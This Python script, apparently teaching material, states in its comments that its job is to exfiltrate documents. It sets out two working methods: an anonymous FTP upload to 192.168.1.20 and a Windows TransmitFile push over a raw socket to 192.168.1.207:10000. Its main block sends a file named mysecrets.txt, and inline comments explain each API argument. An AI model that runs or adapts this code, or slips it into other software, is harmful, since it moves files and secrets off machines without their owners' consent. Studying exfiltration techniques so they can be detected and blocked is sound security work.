import ftplib  # To use the FTP protocol. (Platform independent function).
import os
import socket
import win32file  # To use Windows-Specific function.

# docpath is the path of the document we want to exfiltrate.
def plain_ftp(docpath, server='192.168.1.20'):
    # Connect to the server.
    ftp = ftplib.FTP(server)
    ftp.login("anonymous", "anon@example.com")
    ftp.cwd('/pub/')
    ftp.storbinary("STOR " + os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()
'''
    - The '.storbinary()' stores a binary file on the FTP server.
    - STOR is a FTP command to store a file on the server.
    - The 'os.path.basename' function extracts the file name from the file path.
    - "rb" means rEAD bINARY from the opened file to avoid any curation on transit.
    - 1024 is the buffer size for stable 1Kb transmission.
'''

# Windows specific function, no FTP for this one.
def transmit(document_path):
    client = socket.socket()
    # Specify a server and an open port to connect to.
    client.connect(('192.168.1.207', 10000))
    with open(document_path, 'rb') as f:
        # Windows function (API Call) for file transmission.
        win32file.TransmitFile(
            client,
            win32file._get_osfhandle(f.fileno()),
            0, 0, None, 0, b'', b'')
'''
    - The transmit API has the following arguments:
    - client = The socket created to establish the connection.
    - win32file._get_osfhandle(f.fileno()) = converts the Python file object into a raw Windows file handle.
    - f.fileno() = returns the OS-level file descriptor.
    - _get_osfhandle() =  wraps it for use with TransmitFile.
    - nNumberOfBytesToWrite -> 0 = send the whole file
    - nNumberOfBytesPerSend -> 0 = let the system decide optimal chunk size
    - None = Optional OVERLAPPED struct (for async I/O) — None means not using it
    - 0, = Reserved flags (e.g. TF_USE_KERNEL_APC, TF_WRITE_BEHIND, etc.) — 0 = default behavior
    - b'', b'' = These are optional header and tail bytes.
'''

if __name__ == '__main__':
    transmit('./mysecrets.txt')
